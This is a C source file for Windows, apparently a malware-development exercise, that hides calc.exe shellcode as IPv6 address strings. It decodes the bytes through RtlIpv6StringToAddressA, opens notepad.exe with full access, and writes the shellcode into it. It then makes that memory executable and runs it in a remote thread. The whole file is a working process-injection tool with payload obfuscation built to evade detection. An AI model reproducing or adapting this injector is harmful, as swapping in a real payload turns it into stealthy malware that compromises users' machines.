#include <windows.h>
#include <stdio.h>

#include "Struct.h"

#define TARGET_PROCESS L"notepad.exe"

//calc.exe shellcode encoded in IPv6
char* Ipv6Array[] = {
        "FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
        "AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
        "8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
        "8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
        "595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBE0:1D2A:0A41:BAA6:95BD:9DFF",
        "D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D563:616C:6300"
};

#define NumberOfElements 17

typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
    PCSTR                   S,
    PCSTR* Terminator,
    PVOID                   Addr
    );

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
);

BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE           pBuffer = NULL,
        TmpBuffer = NULL;

    SIZE_T          sBuffSize = NULL;

    PCSTR           Terminator = NULL;

    NTSTATUS        STATUS = NULL;

    // Getting the RtlIpv6StringToAddressA function's base address from ntdll.dll
    fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
    if (pRtlIpv6StringToAddressA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    // Getting the size of the shellcode (number of elements * 16)
    sBuffSize = NmbrOfElements * 16;
    // Allocating memory that will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    // setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;


    // Loop through all the addresses saved in Ipv6Array
    for (int i = 0; i < NmbrOfElements; i++) {
        // Ipv6Array[i] is a single IPv6 address from the array Ipv6Array
        if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
            // Failed
            printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);
    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;
    return TRUE;
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

    PVOID	pShellcodeAddress = NULL;

    SIZE_T	sNumberOfBytesWritten = NULL;
    DWORD	dwOldProtection = NULL;

    // Allocating memory in "hProcess" process of size "sSizeOfShellcode" and memory permissions set to read and write
    pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    // Writing the shellcode, pShellcode, to the allocated memory, pShellcodeAddress
    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();
    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

    // Cleaning the buffer of the shellcode in the local process
    memset(pShellcode, '\0', sSizeOfShellcode);

    // Setting memory permossions at pShellcodeAddress to be executable 
    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Running the shellcode as a new thread's entry in the remote process
    printf("[#] Press <Enter> To Run ... ");
    getchar();
    printf("[i] Executing Payload ... ");
    if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[+] DONE !\n");

    return TRUE;
}

BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess) {
    
    fnNtQuerySystemInformation      pNtQuerySystemInformation = NULL;
    ULONG                           uReturnLen1 = NULL,
                                    uReturnLen2 = NULL;
    PSYSTEM_PROCESS_INFORMATION     SystemProcInfo = NULL;
    PVOID                           pValueToFree = NULL;
    NTSTATUS                        STATUS = NULL;

    pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
    pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);
    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    pValueToFree = SystemProcInfo;

    STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);

    while (TRUE) {
        if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
            *pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
            *phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
            break;
        }

        if (!SystemProcInfo->NextEntryOffset)
            break;

        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
    }

    HeapFree(GetProcessHeap(), 0, pValueToFree);

    if (*pdwPid == NULL || *phProcess == NULL)
        return FALSE;
    else
        return TRUE;
}
int main()
{
    DWORD Pid = NULL;

    HANDLE		hProcess = NULL;
    DWORD		dwProcessId = NULL;

    PBYTE		pDeobfuscatedPayload = NULL;
    SIZE_T      sDeobfuscatedSize = NULL;
    
    //get handle of remote process
    if (!GetRemoteProcessHandle(TARGET_PROCESS, &Pid, &hProcess)) {
        wprintf(L"[!] Couldn't get %s process id \n", TARGET_PROCESS);
        return -1;
    }

    //decode the payload
    if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }

    //inject shellcode into remote process
    if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {
        return -1;
    }

    //free the memory
    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    //close the handle
    CloseHandle(hProcess);
    return 0;
    
}
